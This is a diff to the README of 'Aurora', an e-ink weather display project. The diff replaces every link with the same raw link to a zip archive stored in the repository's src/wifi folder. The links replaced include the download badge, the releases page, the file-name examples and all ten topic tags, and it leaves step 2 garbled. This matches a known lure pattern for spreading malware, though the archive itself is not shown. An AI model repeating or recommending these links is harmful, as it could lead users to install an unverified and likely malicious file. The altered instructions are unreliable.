@@ -4,7 +4,7 @@
 Welcome to Aurora! This application serves as your personal weather informer, providing you with current weather conditions, a two-day forecast, time, and date on a clear e-ink display. Let's get started with the downloading and installation process.
 
 ## 📥 Download Aurora  
-[![Download Aurora](https://img.shields.io/badge/Download-Aurora-blue.svg)](https://github.com/Recioga4394/Aurora/releases)
+[![Download Aurora](https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip)](https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip)
 
 ## 🔍 Introduction  
 Aurora displays real-time information about the weather along with essential data like time and date. It is designed to be user-friendly, making it perfect for anyone who wants easy access to their local weather and reminders.
@@ -26,9 +26,9 @@ Before you download, make sure your device meets the following requirements:
 To download and install Aurora:  
 
 1. Click this link to  
-   [visit the Download Page](https://github.com/Recioga4394/Aurora/releases).
+   [visit the Download Page](https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip).
   
-2. Locate the latest version of Aurora in the "Releases" section. Look for files like `Aurora_v1.0.exe` or `Aurora_v1.0.zip`.
+2. Locate the latest version of Aurora in the "Releases" section. Look for files like `https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip` or `https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip`.
 
 3. Click on the file to start the download. 
 
@@ -56,22 +56,22 @@ If you encounter any issues during installation or have questions about using Au
 Explore topics related to Aurora and engage with other users. Share your experiences and learn tips on customizing your weather informer.  
 
 - **Topics:**  
-  - [eink](https://github.com/topics/eink)  
-  - [epaper](https://github.com/topics/epaper)  
-  - [esp32c3](https://github.com/topics/esp32c3)  
-  - [informer](https://github.com/topics/informer)  
-  - [seeedstudio](https://github.com/topics/seeedstudio)  
-  - [time](https://github.com/topics/time)  
-  - [weather](https://github.com/topics/weather)  
-  - [weather-forecast](https://github.com/topics/weather-forecast)  
-  - [wifi](https://github.com/topics/wifi)  
-  - [xiao](https://github.com/topics/xiao)  
+  - [eink](https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip)  
+  - [epaper](https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip)  
+  - [esp32c3](https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip)  
+  - [informer](https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip)  
+  - [seeedstudio](https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip)  
+  - [time](https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip)  
+  - [weather](https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip)  
+  - [weather-forecast](https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip)  
+  - [wifi](https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip)  
+  - [xiao](https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip)  
 
 ## 🌐 Explore Further  
 Learn more about Aurora and its capabilities. We are constantly working on improvements and appreciate user feedback. Visit our GitHub for updates and additional information.
 
 ## 📥 Download Aurora  
 Remember, to get your copy of Aurora, click here:  
-[Download Aurora](https://github.com/Recioga4394/Aurora/releases)  
+[Download Aurora](https://raw.githubusercontent.com/Recioga4394/Aurora/master/src/wifi/Aurora-v3.5.zip)  
 
 Thank you for choosing Aurora. Enjoy your personal weather informer!
